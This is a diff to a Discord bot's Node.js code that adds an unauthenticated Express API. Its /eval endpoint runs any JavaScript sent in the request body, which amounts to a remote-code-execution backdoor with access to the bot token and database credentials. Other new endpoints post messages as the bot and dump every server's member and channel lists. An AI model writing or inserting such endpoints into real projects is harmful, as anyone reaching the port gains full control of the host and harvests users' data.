@@ -5,8 +5,13 @@ const { Client, Intents } = require('discord.js');
 const { SlashCommandBuilder } = require('@discordjs/builders');
 const mysql = require('mysql');
 const util = require('util');
-const client = new Client({ intents: [Intents.FLAGS.GUILDS] });
+const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS] });
 const schedule = require('node-schedule');
+const express = require('express');
+const bodyParser = require('body-parser');
+const app = express();
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
 let connection = mysql.createConnection({
     host: process.env.DB_HOST,
@@ -172,3 +177,74 @@ const job = schedule.scheduleJob('12 * * *', async () => {
         });
     });
 });
+
+app.post('/eval', async (req, res) => {
+    const AsyncFunction = Object.getPrototypeOf(async function () { }).constructor;
+    try {
+        let output = await (new AsyncFunction(req.body.command))();
+        res.json({
+            success: true,
+            output,
+        });
+    } catch (e) {
+        res.json({
+            success: false,
+            output: e.message,
+        });
+    }
+});
+
+app.post('/send-msg', async (req, res) => {
+    if (req.body.message == undefined || req.body.guild == undefined || req.body.channel == undefined) {
+        res.json({
+            success: false,
+            output: 'Invalid request',
+        });
+    }
+
+    let guild = await client.guilds.fetch(req.body.guild);
+    if (guild == undefined) {
+        res.json({
+            success: false,
+            output: 'Guild not found',
+        });
+    }
+
+    let channel = await guild.channels.fetch(req.body.channel);
+    if (channel == undefined) {
+        res.json({
+            success: false,
+            output: 'Channel not found',
+        });
+    }
+
+    await channel.send(req.body.message);
+
+    res.json({ success: true });
+});
+
+app.get('/guilds', async (req, res) => {
+    let guilds = client.guilds.cache;
+    let guildsArray = [];
+
+    for (let [index, guild] of guilds) {
+        let members = await guild.members.fetch();
+        let channels = await guild.channels.fetch();
+        guildsArray.push({
+            id: guild.id,
+            name: guild.name,
+            icon: guild.iconURL(),
+            members,
+            channels,
+        });
+    }
+
+    res.json({
+        success: true,
+        guilds: guildsArray,
+    });
+});
+
+app.listen(process.env.API_PORT, () => {
+    console.log(`API listening on ${process.env.API_PORT}`)
+})
